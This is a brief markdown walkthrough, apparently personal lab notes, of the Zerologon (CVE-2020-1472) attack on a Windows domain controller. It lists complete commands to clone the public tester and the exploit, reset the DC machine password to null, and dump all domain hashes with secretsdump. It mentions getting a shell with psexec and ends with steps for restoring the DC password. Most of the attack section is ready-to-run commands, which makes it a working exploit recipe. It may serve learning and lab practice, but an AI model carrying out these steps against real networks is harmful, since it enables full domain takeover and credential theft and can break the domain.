- - -
### What is this? 
Acctually this is a very serius vulnerabilty or we can say bug which we can perform to get domain Controller on the Target Domain.  In this attack the exploit sets the DC's password to NULL so that we can authenticate. And Then we have to restore it otherwise the  Domain will be 
Destroyed.  
- - -
> [! Note ]
>  Before running these tools we should have latest version of impackets.
<br>

## Detection : 

```sh
git clone https://github.com/SecuraBV/CVE-2020-1472.git ; cd CVE-2020-1472/ ; pip install -r requirements.txt ; chmod 755 * ; 
```

```python
python3 zerologon_tester.py HYDRA-DC 10.10.10.1 
```

![Imgur](https://i.imgur.com/NR2e5bJ.png)
<br>

- - -
## Attacking Steps : 

```sh
git clone https://github.com/dirkjanm/CVE-2020-1472.git ; cd CVE-2020-1472/ ; chmod 755 * ;
```

```python
 python3 cve-2020-1472-exploit.py HYDRA-DC 10.10.10.1 
```

![Imgur](https://i.imgur.com/kUi9dhH.png)

```python
 secretsdump.py -just-dc MARVEL/HYDRA-DC\$@10.10.10.1 
```

![Imgur](https://i.imgur.com/6FkK9zb.png)

 **Now we can do anything we want , we can get a shell with psexec or anything....**
<br>

- - -
## Restoration : 
Restoring the domain controller otherwise the whole domain will be finished ! ! 

**Copy the administrator's hash** and then ; 

```python
secretsdump.py administrator@10.10.10.1 -hashes <administrator-hash>  
```

Copy the  plain-password-hex of DC. 

![Imgur](https://i.imgur.com/LNPhQw8.png)

```python
python3 ./restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 10.10.10.1 -hexpass <plain-password-hex> 
```

![Imgur](https://i.imgur.com/UdTXpZd.png)
<br>

- - -




